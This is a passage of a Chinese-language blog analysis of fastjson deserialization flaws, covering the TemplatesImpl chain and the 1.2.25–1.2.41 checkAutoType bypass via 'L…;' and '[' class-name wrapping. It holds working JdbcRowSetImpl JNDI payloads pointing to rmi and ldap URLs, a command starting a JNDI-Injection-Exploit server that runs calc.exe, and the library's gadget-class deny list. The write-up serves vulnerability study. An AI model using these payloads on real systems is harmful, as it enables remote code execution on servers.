<p>这是后半段的利用链，触发的方法是getOutputProperties，这是TemplatesImpl类中的一个getter方法，主要获取_outputProperties属性</p>
<p>而前半部分的调用链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">setValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">deserialze:45, JavaObjectDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parseObject:339, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:302, JSON (com.alibaba.fastjson)</span><br><span class="line">main:10, CveTest1 (FastJson)</span><br></pre></td></tr></table></figure>

<p>另外在<code>parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)</code>中存在解析json字符串的代码，并且收集符合要求的getter函数，getOutputProperties就是其中的一个</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> config.getDeserializer(clazz);</span><br><span class="line"><span class="keyword">return</span> deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure>

<p>第一句代码在367行，一直步入到JavaBeanInfo类中的build函数就是收集getter方法的函数</p>
<p>其调用栈如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">build:<span class="number">130</span>, JavaBeanInfo (com.alibaba.fastjson.util)</span><br><span class="line">createJavaBeanDeserializer:<span class="number">526</span>, ParserConfig (com.alibaba.fastjson.parser)</span><br><span class="line">getDeserializer:<span class="number">461</span>, ParserConfig (com.alibaba.fastjson.parser)</span><br><span class="line">getDeserializer:<span class="number">312</span>, ParserConfig (com.alibaba.fastjson.parser)</span><br><span class="line">parseObject:<span class="number">367</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1327</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">deserialze:<span class="number">45</span>, JavaObjectDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:<span class="number">639</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parseObject:<span class="number">339</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:<span class="number">302</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">main:<span class="number">10</span>, CveTest1 (FastJson)</span><br></pre></td></tr></table></figure>

<p><strong>为什么_bytecodes需要base64编码</strong></p>
<p>调用栈如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">bytesValue:<span class="number">112</span>, JSONScanner (com.alibaba.fastjson.parser)</span><br><span class="line">deserialze:<span class="number">136</span>, ObjectArrayCodec (com.alibaba.fastjson.serializer)</span><br><span class="line">parseArray:<span class="number">723</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">deserialze:<span class="number">177</span>, ObjectArrayCodec (com.alibaba.fastjson.serializer)</span><br><span class="line">parseField:<span class="number">71</span>, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:<span class="number">773</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">600</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">188</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">184</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:<span class="number">368</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1327</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">deserialze:<span class="number">45</span>, JavaObjectDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:<span class="number">639</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parseObject:<span class="number">339</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:<span class="number">302</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">main:<span class="number">10</span>, CveTest1 (FastJson)</span><br></pre></td></tr></table></figure>

<p>其中bytesValue函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] bytesValue() &#123;</span><br><span class="line">    <span class="keyword">return</span> IOUtils.decodeBase64(text, np + <span class="number">1</span>, sp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>在代码逻辑中，字段的值从String恢复成<code>byte[]</code>，会经过一次base64解码</strong>。这是应该是fastjson在传输<code>byte[]</code>中做的一个内部规定。序列化时应该也会对byte[]自动base64编码</p>
<p><strong>要调用TemplatesImple类的getOutputProperties方法，但是为什么是<code>_outputProperties</code>字段，多了一个<code>_</code>？</strong></p>
<p>调用栈如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">smartMatch:<span class="number">807</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:<span class="number">724</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">600</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">188</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">184</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:<span class="number">368</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1327</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">deserialze:<span class="number">45</span>, JavaObjectDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:<span class="number">639</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parseObject:<span class="number">339</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:<span class="number">302</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">main:<span class="number">10</span>, CveTest1 (FastJson)</span><br></pre></td></tr></table></figure>

<p>其中smartMatch函数中将<code>_</code>替换成空</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fieldDeserializer == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">snakeOrkebab</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">key2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; key.length(); ++i) &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> key.charAt(i);</span><br><span class="line">        <span class="keyword">if</span> (ch == <span class="string">&#x27;_&#x27;</span>) &#123;</span><br><span class="line">            snakeOrkebab = <span class="literal">true</span>;</span><br><span class="line">            key2 = key.replaceAll(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">            snakeOrkebab = <span class="literal">true</span>;</span><br><span class="line">            key2 = key.replaceAll(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>对@type标签的值进行了黑名单和白名单的限制，即使用了checkAutoType函数处理@type中的值</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xz.aliyun.com/t/7027#toc-7">JAVA反序列化—FastJson组件 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://xz.aliyun.com/t/12096#toc-3">从0到1的fastjson的反序列化漏洞分析 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://mp.weixin.qq.com/s/SOKLC_No0hV9RhAavF2hcw">【两万字原创长文】完全零基础入门Fastjson系列漏洞（基础篇） (qq.com)</a></p>
<h2 id="fastjson1-2-25-1-2-41"><a href="#fastjson1-2-25-1-2-41" class="headerlink" title="fastjson1.2.25-1.2.41"></a>fastjson1.2.25-1.2.41</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><strong>知识点1</strong></p>
<p>fastjson1.2.25版本加入了黑白名单机制，具体黑名单如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure>

<p>检测函数是<code>com.alibaba.fastjson.parser.ParserConfig</code>中的checkAutoType函数</p>
<p>如果开启了autoType：先判断类名是否在白名单中，如果匹配成功就使用TypeUtils.loadClass加载；如果不在则去匹配黑名单，在黑名单中则抛出异常</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">            <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果没有开启autoType：先判断是否在黑名单中，如果不在再去判断是否在白名单中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后如果黑名单和白名单都没有匹配，若开启了autoType或者expectClass不为空（指定了Class对象）时，才会调用TypeUtils.loadClass，否则不加载</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入loadClass函数，其含义是：如果类名以<code>[</code>开头，则表示该类是一个数组类型，递归调用loadClass来加载数组元素中的Class对象，并且使用Array.newInstance创建一个空数组对象并返回该数组对象的Class对象；</p>
<p>如果类名以<code>L</code>开头并且以<code>;</code>结尾，表示该类是一个普通的Java类，去掉<code>L</code>和<code>;</code>再递归调用loadClass</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">    Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">    <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (classLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = classLoader.loadClass(className);</span><br><span class="line">        mappings.put(className, clazz);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    <span class="comment">// skip</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>知识点2</strong></p>
<p>autoType是默认禁用的，开启的方式有以下3种：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>使用代码进行添加：ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;org.example.,org.javaweb.&quot;</span>);或者ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>加上JVM启动参数：-Dfastjson.parser.autoTypeAccept=org.example.</span><br><span class="line">    </span><br><span class="line"><span class="number">3.</span>在fastjson.properties中添加：fastjson.parser.autoTypeAccept=org.example.</span><br></pre></td></tr></table></figure>

<h3 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h3><p>Maven依赖、JDK8u66下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>下载<a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0%EF%BC%8C%E5%90%AF%E5%8A%A8%E5%B7%A5%E5%85%B7">https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0，启动工具</a></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&quot;C:\Program Files\Java\jdk1.<span class="number">8</span>.<span class="number">0</span>_66\bin\java.exe&quot; -jar .\JNDI-Injection-Exploit-<span class="number">1</span>.<span class="number">0</span>-SNAPSHOT-all.jar -A <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> -C &quot;calc.exe&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230708140815.png"></p>
<h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><p>POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/tre2da\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>为什么这样构造</strong></p>
<p>还是一样的目的，要绕过checkAutoType函数，就不能够被黑名单拦截，所以在前面加一个L就能解决问题，当然这个L也不是乱加的，因为后面有代码进行处理（执行这段代码也需要开启autoType）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入到loadClass函数中，有这样一段处理代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>满足以<code>L</code>开头，以<code>;</code>结尾，就能够剔除掉返回我们想要的类名，然后再迭代执行loadClass，返回我们想要的clazz，执行栈如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">loadClass:<span class="number">1110</span>, TypeUtils (com.alibaba.fastjson.util) [<span class="number">2</span>]</span><br><span class="line">loadClass:<span class="number">1091</span>, TypeUtils (com.alibaba.fastjson.util) [<span class="number">1</span>]</span><br><span class="line">checkAutoType:<span class="number">861</span>, ParserConfig (com.alibaba.fastjson.parser)</span><br><span class="line">parseObject:<span class="number">322</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1327</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1293</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">137</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:<span class="number">128</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">main:<span class="number">25</span>, POC (FastJson)</span><br></pre></td></tr></table></figure>

<p>当然，由于loadClass是迭代的，不管加几层<code>L</code>和<code>;</code>都能解析，也可以加<code>[</code>，下面这个payload也适用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/ift2ty\&quot;, \&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>在loadClass函数中同样有处理<code>[</code>的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">    Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">    <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>JdbcRowSetImpl链的利用</strong></p>
<p>在前面分析得到，根据我们传递的类名得到反序列化器会经过JavaBeanInfo的build函数，会收集所有的setter方法，接下就是逐一调用相关字段的set方法</p>
<p>这里关注<code>JdbcRowSetImpl</code>类的<code>setAutoCommit()</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAutoCommit</span><span class="params">(<span class="type">boolean</span> autoCommit)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="comment">// The connection object should be there</span></span><br><span class="line">    <span class="comment">// in order to commit the connection handle on or off.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        conn.setAutoCommit(autoCommit);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Coming here means the connection object is null.</span></span><br><span class="line">        <span class="comment">// So generate a connection handle internally, since</span></span><br><span class="line">        <span class="comment">// a JdbcRowSet is always connected to a db, it is fine</span></span><br><span class="line">        <span class="comment">// to get a handle to the connection.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get hold of a connection handle</span></span><br><span class="line">        <span class="comment">// and change the autcommit as passesd.</span></span><br><span class="line">        conn = connect();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// After setting the below the conn.getAutoCommit()</span></span><br><span class="line">        <span class="comment">// should return the same value.</span></span><br><span class="line">        conn.setAutoCommit(autoCommit);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它调用了本类的connect方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get a JDBC connection.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// First check for Connection handle object as such if</span></span><br><span class="line">    <span class="comment">// &quot;this&quot; initialized  using conn.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> conn;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Connect using JNDI.</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="type">DataSource</span> <span class="variable">ds</span> <span class="operator">=</span> (DataSource)ctx.lookup</span><br><span class="line">                (getDataSourceName());</span><br><span class="line">            <span class="comment">//return ds.getConnection(getUsername(),getPassword());</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(getUsername() != <span class="literal">null</span> &amp;&amp; !getUsername().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> ds.getConnection(getUsername(),getPassword());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> ds.getConnection();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (javax.naming.NamingException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getUrl() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Check only for getUrl() != null because</span></span><br><span class="line">        <span class="comment">// user, passwd can be null</span></span><br><span class="line">        <span class="comment">// Connect using the driver manager.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> DriverManager.getConnection</span><br><span class="line">            (getUrl(), getUsername(), getPassword());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键代码在于<code>Context ctx = new InitialContext();</code>和<code>DataSource ds = (DataSource)ctx.lookup(getDataSourceName());</code></p>
<p>要执行到这里需要满足以下条件</p>
<ul>
<li><code>conn != null</code></li>
<li><code>getDataSourceName() != null</code></li>
</ul>
<p>setDataSourceName方法中设置了dataSource并且conn&#x3D;null，同时满足这两个条件，而setDataSourceName方法会在解析dataSourceName参数是调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDataSourceName</span><span class="params">(String dsName)</span> <span class="keyword">throws</span> SQLException&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!getDataSourceName().equals(dsName)) &#123;</span><br><span class="line">            <span class="built_in">super</span>.setDataSourceName(dsName);</span><br><span class="line">            conn = <span class="literal">null</span>;</span><br><span class="line">            ps = <span class="literal">null</span>;</span><br><span class="line">            rs = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.setDataSourceName(dsName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><p>把黑名单明文修改成黑名单hash；</p>
<p>在checkAutoType函数先进行一轮首尾是否为<code>L</code>和<code>;</code>的判断，若是则去除首尾再进行黑名单匹配</p>
